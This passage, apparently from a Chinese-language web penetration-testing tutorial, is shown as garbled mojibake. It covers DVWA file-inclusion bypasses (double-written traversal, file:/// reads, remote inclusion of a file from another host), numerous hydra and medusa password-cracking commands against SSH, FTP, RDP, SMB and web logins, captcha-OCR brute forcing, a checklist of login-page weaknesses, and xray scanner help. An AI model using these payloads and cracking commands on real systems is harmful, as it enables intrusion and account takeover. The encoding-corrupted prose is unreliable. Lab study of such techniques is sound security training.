·ï¼Œé‚£ä¸ªæ˜¯webæœåŠ¡ç¨‹åºè‡ªèº«çš„è§£ææ¼æ´ï¼Œè¿™ä¸ªæ˜¯ç¨‹åºå‘˜ä»£ç æ¼æ´æ˜‚ã€‚ 6-9 str_replaceå‡½æ•°ç»•è¿‡è¿™æ˜¯ä¸€ä¸ªæ›¿æ¢æ•°æ®çš„å‡½æ•°ï¼Œè€Œä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œæ‰€ä»¥æœ‰æ¼æ´ã€‚ ## ä½¿ç”¨str_replaceå‡½æ•°æ˜¯æå…¶ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡æ›¿æ¢è§„åˆ™ã€‚ ## ä¾‹å¦‚pagehthttp://tp://192.168.0.103/phpinfo.txtæ—¶ï¼Œstr_replaceå‡½æ•°ä¼šå°†http://åˆ é™¤ï¼Œäºæ˜¯page=http://192.168.0.103/phpinfo.txtï¼ŒæˆåŠŸæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ ## åŒæ—¶ï¼Œå› ä¸ºæ›¿æ¢çš„åªæ˜¯â€œ..â€ã€â€œ..\\â€ï¼Œæ‰€ä»¥å¯¹é‡‡ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼åŒ…å«æ–‡ä»¶æ˜¯ä¸ä¼šå—åˆ°ä»»ä½•é™åˆ¶çš„ã€‚ 1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œå†™å¤šä¸ª..é‚£ä¹ˆstr_replaceå…¶å®åªæ›¿æ¢ä¸€æ¬¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›¸å¯¹è·¯å¾„è¿˜èƒ½ç”Ÿæ•ˆ http://192.168.0.103/dvwa/vulnerabilities/fi/page=..././..././..././..././..././xampp/htdocs/dvwa/php.ini 2ã€ç»å¯¹è·¯å¾„ä¸å—ä»»ä½•å½±å“ http://192.168.0.103/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini 3ã€è¿œç¨‹æ–‡ä»¶åŒ…å« http://192.168.0.103/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt ç¤ºä¾‹ï¼š ç”¨æˆ‘ä»¬çš„dvwaï¼Œç„¶åå°†å®‰å…¨ç­‰çº§è°ƒä¸ºä¸­å± é‚£ä¹ˆå„ç§æ¼æ´çš„ä»£ç ä¼šè‡ªåŠ¨å‘ç”Ÿå˜åŒ–ï¼Œæ¯”å¦‚ï¼š è¿™ä¸ªä»£ç çš„ä½œç”¨ï¼š1.ä¸èƒ½è¿œç¨‹åŒ…å«äº† 2.å°†..ç­‰ç›¸å¯¹è·¯å¾„å¹²æ‰äº†ï¼Œè¿™ç§æƒ…å†µå¦‚ä½•çªç ´å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ã€‚æ¯”å¦‚æˆ‘ä»¬å°±æ‰¾è¿™ä¸ªæ–‡ä»¶ ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®ï¼š ç›¸å¯¹è·¯å¾„æ–¹å¼ï¼š æ–¹å¼1ï¼š æ–¹å¼2ï¼šæˆ‘ä»¬è®¿é—®ä¸åœ¨å½“å‰ç›®å½•çš„æ–‡ä»¶ï¼šæˆ‘ä»¬æŠŠx.phpæ”¾åˆ°è¿™ä¸ªç›®å½•ä¸­æ¥ http://192.168.18.16/dvwa/vulnerabilities/fi/?page=..././x.php å¦‚ä¸‹,ä¹Ÿæ˜¯å¯ä»¥çš„,å¦‚æœä½ è¯»å–çš„æ˜¯ä»–æºä»£ç ä¸­çš„æŸäº›æ–‡ä»¶æˆ–è€…æŸäº›é…ç½®æ–‡ä»¶,æˆ‘ä»¬éœ€è¦ç¼–ç ä¸€ä¸‹,ä¸ç„¶å¦‚æœæ˜¯phpæ–‡ä»¶,é‚£ä¹ˆæ–‡ä»¶ä¸­çš„ä»£ç ä¼šæ‰§è¡Œ,å¯èƒ½ä¼šçœ‹åˆ°ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™çš„é—®é¢˜.å°±åˆ©ç”¨ä¸Šé¢æˆ‘ä»¬è®²è¿‡çš„php:åè®®æ¥æ. æ¥ä¸‹æ¥å°†dvwaåšä¸€ä¸ªé«˜å®‰å…¨ç­‰çº§ å†æ¥çœ‹æ–‡ä»¶åŒ…å«: æŠ¥é”™äº†,è¿™è‚¯å®šæ˜¯phpç‰ˆæœ¬çš„é—®é¢˜,åˆ‡æ¢ä¸€ä¸‹ç‰ˆæœ¬: ç„¶åå†çœ‹æ•ˆæœ: é€šè¿‡æŸ¥çœ‹æºä»£ç ,æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå‡½æ•°,å«åšfnmatch,é‚£ä¹ˆè¿™ä¸ªå‡½æ•°æ˜¯åšä»€ä¹ˆçš„å‘¢?æˆ‘ä»¬çœ‹ä¸‹é¢ 6-10 fnmatchå‡½æ•°ç»•è¿‡fnmatchå‡½æ•°æ˜¯åšæ­£åˆ™åŒ¹é…çš„. if(!fnmatch(â€œfileâ€œ,$file)$file!â€include.phpâ€) ## å½“æ–‡ä»¶æ—¢ä¸æ˜¯â€include.phpâ€ä¹Ÿä¸æ˜¯â€file*â€ï¼ˆæ–‡ä»¶åfileå¼€å¤´ï¼‰æ—¶æ‰æŠ›å‡ºé”™è¯¯ï¼Œåä¹‹æ„æ€ï¼Œå¦‚æœæ–‡ä»¶åç¬¦åˆå…¶ä¸­ä¸€ä¸ªæ¡ä»¶æ—¢å¯ä»¥ã€‚ pagefile:C:xampphtdocsdvwaphp.ini åˆšå¥½æ»¡è¶³â€file*â€ï¼ˆæ–‡ä»¶åfileå¼€å¤´ï¼‰ã€‚æ³¨æ„ï¼Œfileåè®®ç”¨çš„æ˜¯ä¸‰ä¸ªåæ–œæ æ˜‚ æ„é€ url http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini ## æˆåŠŸè¯»å–äº†æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ ç¤ºä¾‹: æ¯”å¦‚æˆ‘ä»¬è¯»å–cç›˜ä¸‹é¢çš„boot.iniæ–‡ä»¶ï¼š 6-11 PHPå†…ç½®åè®®PHPå¸¦æœ‰å¾ˆå¤šå†…ç½®URLé£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼fopen()ã€copy()ã€file_exists()å’Œfilesize()çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ å…³äºphp:åè®®è¯¦è§£ï¼Œå‚çœ‹æ–‡æ¡£:https://www.php.net/manual/zh/wrappers.php.php é‚£ä¹ˆï¼Œå¦‚æœåšæ‰èƒ½ä¿è¯å®‰å…¨å‘¢ï¼Ÿçœ‹dvwaï¼Œæˆ‘ä»¬å°†å®‰å…¨çº§åˆ«è°ƒåˆ¶impossibleï¼Œæ²¡æœ‰æ¼æ´çš„æ„æ€ çœ‹ä»£ç ï¼šç›´æ¥ä½¿ç”¨çš„æ˜¯ä¸ç­‰äºæŸä¸ªç»å¯¹åç§° åï¼Œå·¥å…·ä½¿ç”¨ 10-1 æš´åŠ›ç ´è§£10-1-1 hydrahttp://www.thc.org/thc-hydra â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- å®˜ç½‘ https://cloud.tencent.com/developer/article/1643633?from=15425 â€”â€”â€”â€”â€”â€”â€”â€”â€“ ä½¿ç”¨æ•™ç¨‹ hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT] -R ## ç»§ç»­ä»ä¸Šä¸€æ¬¡è¿›åº¦æ¥ç€ç ´è§£ã€‚ -S ## é‡‡ç”¨SSLé“¾æ¥ã€‚ -s ## PORT å¯é€šè¿‡è¿™ä¸ªå‚æ•°æŒ‡å®šéé»˜è®¤ç«¯å£ã€‚ -l ## LOGIN æŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚ -L ## FILE æŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚ -p ## PASS å°å†™ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸ã€‚ -P ## FILE å¤§å†™ï¼ŒæŒ‡å®šå¯†ç å­—å…¸ã€‚ -e ns ## å¯é€‰é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šç”¨æˆ·å’Œå¯†ç è¯•æ¢ã€‚ -C FILE ## ä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å:å¯†ç â€æ¥ä»£æ›¿-L-På‚æ•°ã€‚ -M FILE ## æŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ä¸€è¡Œä¸€æ¡ã€‚ -o FILE ## æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚ -f ## åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚ -t TASKS ## åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¸º16ã€‚ -w TIME ## è®¾ç½®æœ€å¤§è¶…æ—¶çš„æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤æ˜¯30sã€‚ -v -V ## æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ã€‚ server ## ç›®æ ‡ip service æŒ‡å®šæœåŠ¡åï¼Œæ”¯æŒçš„æœåŠ¡å’Œåè®®ï¼štelnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afpç­‰ç­‰ã€‚ OPT ## å¯é€‰é¡¹ æŒ‡ä»¤ï¼šhydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh æŒ‡ä»¤ï¼šhydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh ç ´è§£æˆåŠŸï¼Œç›´æ¥æ˜¾ç¤ºç»“æœã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ -o é€‰é¡¹æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è¯•è¯•çœ‹ hydra -L user.txt -P top100.txt -vV -e ns -o save.log 192.168.1.104 ssh å…¶å®ƒå®ä¾‹ï¼š 1.ç ´è§£sshï¼š # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip ssh # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -o save.log -vV ip ssh 2.ç ´è§£ftpï¼š # hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV # hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV ä¸‹é¢çš„æ˜¯ç ´è§£webçš„ï¼Œwebçš„æš´åŠ›ç ´è§£ä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨burpæ¯”è¾ƒæ–¹ä¾¿ä¸€äº›ï¼Œæ‰€ä»¥ä¸‹é¢çš„å¤§å®¶ç®€å•çœ‹çœ‹å…ˆ 3.getæ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼š # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get admin # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get adminindex.php 4.postæ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•ï¼š # hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s 80 ip http-post-form â€œadminlogin.php:username^USER^password^PASS^submitlogin:sorry passwordâ€ # hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form â€œlogin.php:id^USER^passwd^PASS^:wrong username or passwordâ€ ï¼ˆå‚æ•°è¯´æ˜ï¼š-tåŒæ—¶çº¿ç¨‹æ•°3ï¼Œ-lç”¨æˆ·åæ˜¯adminï¼Œå­—å…¸pass.txtï¼Œä¿å­˜ä¸ºout.txtï¼Œ-f å½“ç ´è§£äº†ä¸€ä¸ªå¯† ç å°±åœæ­¢ï¼Œ 10.36.16.18ç›®æ ‡ipï¼Œhttp-post-formè¡¨ç¤ºç ´è§£æ˜¯é‡‡ç”¨httpçš„postæ–¹å¼æäº¤çš„è¡¨å•å¯†ç ç ´ è§£,ä¸­çš„å†…å®¹æ˜¯è¡¨ç¤ºé”™è¯¯çŒœè§£çš„è¿”å›ä¿¡æ¯æç¤ºã€‚ï¼‰ 5.ç ´è§£httpsï¼š # hydra -m index.php -l muts -P pass.txt 10.36.16.18 https 6.ç ´è§£teamspeakï¼š # hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s ç«¯å£å· -vV ip teamspeak 7.ç ´è§£ciscoï¼š # hydra -P pass.txt 10.36.16.18 cisco # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 8.ç ´è§£smbï¼š # hydra -l administrator -P top100.txt 192.168.0.102 smb 9.ç ´è§£pop3ï¼šæˆ–è€…smtpç­‰åè®®ï¼Œè¿™éƒ½æ˜¯é‚®ç®±åè®®ï¼Œåœ¨æˆ‘ä»¬çš„qqé‚®ç®±ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¯ä»¥è‡ªè¡Œå¼€å¯çš„ï¼Œå¯ä»¥æ‰¾ä¸€æ‰¾qqé‚®ç®±çš„popæœåŠ¡å™¨ipæˆ–è€…åŸŸåã€ç«¯å£ç­‰ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±çš„é‚®ç®±è®¾ç½®ä¸­å°±èƒ½çœ‹åˆ°ã€‚å¸¦å¤§å®¶çœ‹çœ‹å§ã€‚ # hydra -l muts -P pass.txt my.pop3.mail pop3 10.ç ´è§£rdpï¼š å°±æ˜¯3389ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å¯ä¸€ä¸‹windows2003çš„3389ï¼Œç„¶åæµ‹è¯•ä¸€ä¸‹ï¼Œè¿™ä¸ªç»“æœå¯èƒ½å­˜åœ¨è¯¯æŠ¥çš„ã€‚ç›®å‰å¸‚é¢ä¸Šæ‰€æœ‰æš´åŠ›ç ´è§£3389çš„å·¥å…·åŸºæœ¬éƒ½æœ‰è¿™ä¸ªé—®é¢˜ã€‚ # hydra 192.168.13.25 rdp -l administrator -P top100.txt -V 11.ç ´è§£http-proxyï¼š # hydra -l admin -P pass.txt http-proxy:10.36.16.18 12.ç ´è§£imapï¼š # hydra -L user.txt -p secret 10.36.16.18 imap PLAIN # hydra -C defaults.txt -6 imap:[fe80::2c:31ff:fe12:ac11]:143PLAIN æ­¤å·¥å…·å¼ºå¤§ä¹‹å¤„è¿œå¤šäºä»¥ä¸Šæµ‹è¯•ï¼Œå…¶å¯†ç èƒ½å¦ç ´è§£å…³é”®åœ¨äºå¼ºå¤§çš„å­—å…¸ï¼Œå¯¹äºç¤¾å·¥å‹æ¸—é€æ¥è¯´ï¼Œæœ‰æ—¶èƒ½å¤Ÿå¾—åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœ 10-1-2 ç¾æœèmedusahttps://blog.csdn.net/shenshuiwubo123/article/details/90739760 ## medusaï¼ˆç¾æœèï¼‰æ˜¯ä¸€ä¸ªé€Ÿåº¦å¿«ï¼Œæ”¯æŒå¤§è§„æ¨¡å¹¶è¡Œï¼Œæ¨¡å—åŒ–ï¼Œçˆ†ç ´ç™»é™†ï¼Œå¯ä»¥åŒæ—¶å¯¹å¤šä¸ªä¸»æœºï¼Œç”¨æˆ·æˆ–æ˜¯å¯†ç æ‰§è¡Œå¼ºåŠ›æµ‹è¯•ï¼Œmedusaå’Œhydraä¸€æ ·ï¼ŒåŒæ ·å±äºåœ¨çº¿ç ´è§£å·¥å…·ï¼Œä¸åŒçš„æ˜¯ï¼Œmedusaçš„ç¨³å®šæ€§ç›¸è¾ƒäºhydraè¦å¥½å¾ˆå¤šä½†æ˜¯æ”¯æŒçš„æ¨¡å—ç›¸å¯¹äºhydraå°‘ä¸€äº›ã€‚ medusha [-h host|-H file] [-u username | -U file] [-p password | -P file] [-C file] -M modudle [OPT] -h ## ç›®æ ‡ä¸»æœºåç§°æˆ–æ˜¯IPåœ°å€ -H ## åŒ…å«ç›®æ ‡ä¸»æœºåç§°æˆ–æ˜¯IPåœ°å€æ–‡ä»¶ -u ## æµ‹è¯•ç”¨æˆ·å -U ## åŒ…å«æµ‹è¯•ç”¨æˆ·åæ–‡ä»¶ -p ## æµ‹è¯•ç”¨æˆ·åå¯†ç  -P ## åŒ…å«æµ‹è¯•ç”¨æˆ·åå¯†ç æ–‡ä»¶ -C ## ç»„åˆæ¡ä»¶æ–‡ä»¶ -O ## æ—¥å¿—ä¿¡æ¯æ–‡ä»¶ -e[nsns] ## nä»£è¡¨ç©ºå¯†ç ï¼Œsä»£è¡¨ä¸ºå¯†ç äºç”¨æˆ·åç›¸åŒ -M ## æ¨¡å—æ‰§è¡Œmingc -m ## ä¼ é€’å‚æ•°åˆ°æ¨¡å— -d ## æ˜¾ç¤ºæ‰€æœ‰æ¨¡å—åç§° -n ## ä½¿ç”¨éé»˜è®¤TCPç«¯å£ -s ## å¯ç”¨ssl -r ## é‡è¯•æ—¶é—´ï¼Œé»˜è®¤3ç§’ -t ## è®¾å®šçº¿ç¨‹æ•°é‡ 1ã€æŒ‡å®šç”¨æˆ·åäºå¯†ç äºæœåŠ¡è¿›è¡Œç ´è§£ medusa -M ssh -u root -p owaspbwa -h 192.168.72.142 10-1-3 pkavæš´åŠ›ç ´è§£ä½†æ˜¯è¿™ä¸ªå·¥å…·æœ‰ä¸ªåŠŸèƒ½æ²¡æœ‰å¼€å‘å‡ºæ¥ï¼Œç›®æ ‡ç½‘å€æŠ“åŒ…åŠŸèƒ½å®ƒæ˜¯æ²¡æœ‰çš„ï¼Œæ¯”å¦‚åå°ç½‘å€ http://192.168.0.25:81/admin/index.asp å°†æ•°æ®åŒ…é»è´´åˆ°pkavä¸­ï¼Œç„¶åæ·»åŠ æ ‡è®° é…ç½®å¯†ç å­—å…¸ éªŒè¯ç è¯†åˆ«è®¾ç½®ï¼Œæˆ‘ä»¬å…ˆå¯¹è·å–éªŒè¯ç çš„è¯·æ±‚è¿›è¡ŒæŠ“åŒ…ï¼Œæ‹¿åˆ°éªŒè¯ç ç½‘å€ ç½‘å€ http://192.168.0.25:81/admin/safecode.asp? ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æˆ‘ä»¬éªŒè¯ç æ˜¯ä¸ªçº¯æ•°å­—çš„å›¾ç‰‡éªŒè¯ç ã€‚ å°†ç½‘å€è®¾ç½®åˆ°pkavä¸­ ç‚¹å‡»è¯†åˆ«æµ‹è¯•çœ‹æ•ˆæœï¼Œä½†æ˜¯æˆ‘ä»¬å¤šç‚¹å‡»å‡ æ¬¡è¯†åˆ«æµ‹è¯•ï¼Œä½ ä¼šçœ‹åˆ°æœ‰äº›è¯†åˆ«ä¹Ÿæ˜¯é”™è¯¯çš„ï¼Œæ²¡åŠæ³•ï¼Œå›¾åƒè¯†åˆ«ç›®å‰åŸºæœ¬åšä¸åˆ°å®Œå…¨å‡†ç¡® æˆ‘ä»¬ç°åœ¨è¯†åˆ«çš„éªŒè¯ç å›¾ç‰‡æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€äº›ç‚¹ç‚¹ï¼Œæœ‰äº›å›¾ç‰‡åŠ å·¥çš„å¾ˆå¤æ‚ï¼Œç‚¹ã€å…ˆã€åœˆç­‰éƒ½æœ‰ï¼Œè‚‰çœ¼çœ‹èµ·æ¥éƒ½è´¹åŠ²ï¼Œè¿˜æœ‰åƒ12306é‚£ç§éªŒè¯ç ï¼Œç›®å‰çš„OCRæŠ€æœ¯åŸºæœ¬æ—¶æ˜¯æä¸å®šçš„ã€‚ é‡æ”¾é€‰é¡¹è®¾å®šï¼š æš´åŠ›ç ´è§£æˆåŠŸï¼Œè¿™ç§æ˜¯éªŒè¯ç æ¼æ´ï¼Œå¯ä»¥è¢«ocrè¯†åˆ«çš„ï¼Œéƒ½æ˜¯æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æäº¤æ¼æ´ï¼Œä½†æ˜¯éªŒè¯ç å…¶å®åŸºæœ¬æ²¡æœ‰çœŸæ­£çš„å®‰å…¨ï¼Œå°±è¿12306è¿™ç§è¶…å¤æ‚çš„éªŒè¯ç éƒ½æœ‰å¯èƒ½è¢«æå®šï¼Œæœ‰äº›æ‰“ç å¹³å°å°±èƒ½åšåˆ°ï¼Œä½†æ˜¯ä¸åœ¨æˆ‘ä»¬å®‰å…¨äººå‘˜çš„è€ƒè™‘èŒƒå›´ä¹‹å†…æ˜‚ 10-1-4 é˜²æš´åŠ›ç ´è§£## 1) å¼ºåˆ¶è¦æ±‚è¾“å…¥éªŒè¯ç ï¼Œå¦åˆ™ï¼Œå¿…é¡»å®æ–½IPç­–ç•¥,5æ¬¡ç™»å½•ä¸æˆåŠŸç›´æ¥å°ipã€‚ ## 2) éªŒè¯ç åªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨å®Œç«‹å³è¿‡æœŸï¼ä¸èƒ½å†æ¬¡ä½¿ç”¨ ## 3) éªŒè¯ç ä¸è¦å¤ªå¼±ã€‚æ‰­æ›²ã€å˜å½¢ã€å¹²æ‰°çº¿æ¡ã€å¹²æ‰°èƒŒæ™¯è‰²ã€å˜æ¢å­—ä½“ç­‰ã€‚ 10-1-5 ç™»å½•é¡µé¢å­˜åœ¨é‚£äº›æ¼æ´## 1.æ³¨å…¥ç‚¹ å°è¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢sqlæ³¨å…¥è®²çš„ï¼Œä¸çŸ¥é“ç”¨æˆ·åå¯†ç çš„æƒ…å†µä¸‹ç™»å½• ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€‚ã€‚ã€‚ æ³¨å†Œï¼šxssæ”»å‡» ## 2.ä¸å®‰å…¨çš„ç”¨æˆ·æç¤ºï¼Œä¸€èˆ¬æç¤ºç”¨æˆ·åä¸å­˜åœ¨æˆ–å¯†ç åŠéªŒè¯ç é”™è¯¯ æ¯”å¦‚csdnï¼Œçœ‹æç¤ºï¼Œæç¤ºçš„æ˜¯ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼Œæ²¡å‘Šè¯‰ä½ åˆ°åº•æ˜¯å“ªä¸ªä¿¡æ¯é”™è¯¯äº†ï¼Œæ‰€ä»¥æš´åŠ›ç ´è§£èµ·æ¥ä¹Ÿå¾ˆéš¾ï¼Œå¦‚æœæ˜ç¡®æç¤ºä½ ç”¨æˆ·åé”™è¯¯ï¼Œé‚£å°±å¥½æä¸€äº›ï¼ŒæŠŠæ²¡æœ‰æç¤ºç”¨æˆ·åé”™è¯¯çš„æ•°æ®ä¿å­˜ä¸‹æ¥ï¼Œå†å»ç ´è§£å¯†ç ã€‚ ## 3.æŸ¥çœ‹ç™»å½•é¡µé¢æºä»£ç ï¼Œæ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ² çœ‹çœ‹æ˜¯å¦ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€æ³¨é‡Šä¿¡æ¯æç¤ºç­‰ç­‰ï¼Œè¿˜å¯ä»¥çœ‹çœ‹å‰ç«¯éªŒè¯æ˜¯å¦èƒ½å¤Ÿç»•è¿‡ ## 4.ä¸å®‰å…¨çš„éªŒè¯ç  ## 5.åœ¨æ³¨å†Œå¸å·çš„æ—¶å€™æ˜¯å¦å­˜åœ¨ä¸å®‰å…¨çš„æç¤º æ¯”å¦‚è¿™ä¸ªç½‘ç«™ https://bbs.pku.edu.cn/v2/login.php ï¼Œæç¤ºä½ é‚®ç®±åœ°å€ä¸å¯¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æš´åŠ›ç ´è§£å‡ºä¸€äº›æœ‰æ•ˆçš„é‚®ç®±å‡ºæ¥ï¼Œè¿™ä¸ªå«åšæ³¨å†Œæ—¶çš„ä¸å®‰å…¨æç¤ºã€‚ ## 6ï¼Œä¸å®‰å…¨çš„å¯†ç ï¼Œåœ¨æ³¨å†Œå¸å·çš„æ—¶å€™ï¼Œå¯†ç æ²¡æœ‰é™åˆ¶å¤æ‚åº¦ ## 7.åœ¨æš´åŠ›ç ´è§£çš„æ—¶å€™æœªé™æ­¢ipï¼Œé”å®šç”¨æˆ· ## 8.ä¸€ä¸ªå¸å·å¯ä»¥åœ¨å¤šåœ°ç™»å½•ï¼Œæ²¡æœ‰å®‰å…¨æç¤º ## 9.å¸å·ç™»å½•ä¹‹åï¼Œåº”è¯¥å…·å¤‡è¶…æ—¶åŠŸèƒ½ ## 10.ä»»æ„æ— é™æ³¨å†Œå¸å· ä¸€ä¸ªäººä¸€ä¸‹å­æ³¨å†Œäº†1ä¸‡ä¸ªè´¦å·ï¼Œä½ çš„æ•°æ®åº“éƒ½æ”¯æ’‘ä¸ä½ï¼Œè¿™ä¹Ÿç®—æ¼æ´ã€‚ ## 11.OAã€é‚®ä»¶ã€é»˜è®¤å¸å·ç­‰ç›¸å…³ç³»ç»Ÿï¼Œåœ¨ä¸æ˜¯è‡ªå·±æ³¨å†Œçš„æƒ…å†µä¸‹ï¼Œåº”è¯¥åœ¨ç™»å½•ä¹‹åè¦å¼ºè¡Œæ›´æ”¹å¯†ç  ## 12.é€»è¾‘æ¼æ´ï¼Œä»»æ„å¯†ç é‡ç½® ## 13.è¶Šæƒæ¼æ´ è¶Šæƒçš„æ„æ€æ˜¯ï¼šæœ¬æ¥æŸä¸ªç½‘ç«™çš„ç½‘å€é¡µé¢ï¼Œæ¯”å¦‚ adminindex.html æ˜¯éœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„ï¼Œä½†æ˜¯ä»–å‘ç°ä¸ç™»é™†ï¼Œç›´æ¥è®¿é—®è¿™ä¸ªè·¯å¾„ä¹Ÿèƒ½è¿›å»ï¼Œè¿™ç§ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼Œè¿™å°±æ˜¯æ²¡æœ‰åšå¥½æƒé™è®¾ç½®ã€‚å…¶å®è¿™ä¸ªè¶Šæƒå«åšæœªæˆæƒè®¿é—®ã€‚ ## 14.æ•°æ®åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œå¦‚cookice ç™»å½•ä¸€ä¸‹ï¼Œç„¶åæŠ“åŒ…æŸ¥çœ‹cookieé‡Œé¢æ˜¯å¦å«æœ‰æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å¯†ç æ˜æ–‡ã€éªŒè¯ç ç­‰éƒ½æœ‰å¯èƒ½å‡ºç°åœ¨cookieä¸­ã€‚ ## 15.ä¸å®‰å…¨çš„æ•°æ®ä¼ è¾“ï¼Œå¯†ç ä¸ºæ˜æ–‡ï¼Œæœªä½¿ç”¨httpsè¯ä¹¦ ## 16ï¼Œä»»æ„æ–‡ ä»¶ä¸‹è½½ æœ‰çš„ç™»å½•é¡µé¢å¯èƒ½æä¾›ä¸€äº›å¸®åŠ©æ–‡æ¡£ä¸‹è½½ï¼Œç‚¹å‡»ä¸‹è½½çš„æ—¶å€™ï¼Œä½ å¯ä»¥è·å–åˆ°è¿™ä¸ªä¸‹è½½è¿æ¥åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªè¿æ¥åœ°å€ä¸­çš„å‚æ•°æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ 10-2 xray10-2-1 xrayCOMMANDS: webscan, ws Run a webscan task #æ‰«æwebæ¼æ´ servicescan, ss Run a service scan task #æ‰«æä¸»æœºæœåŠ¡ subdomain, sd Run a subdomain task #æ‰«æå­åŸŸå poclint, pl lint yaml poc #pocåˆ†æ transform transform other script to gamma #è½¬æ¢å…¶ä»–çš„gammaè„šæœ¬ reverse Run a standalone reverse server #è¿è¡Œåè¿å¹³å°æœåŠ¡ convert convert results from json to html or from html to json #è¾“å‡ºç»“æœæ ¼å¼è½¬æ¢ genca GenerateToFile CA certificate and key #ç”Ÿæˆcaè¯ä¹¦å’Œkey upgrade check new version and upgrade self if any updates found #æ£€æŸ¥æ–°ç‰ˆæœ¬å’Œå‡çº§ version Show version info #æŸ¥çœ‹xrayç‰ˆæœ¬ help, h Shows a list of commands or help for one command #æŸ¥çœ‹å¸®åŠ© GLOBAL OPTIONS: â€“config FILE Load configuration from FILE (default: â€œconfig.yamlâ€) #æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨ â€“log-level value Log level, choices are debug, info, warn, error, fatal #æ—¥å¿—çš„ç­‰çº§ â€“help, -h 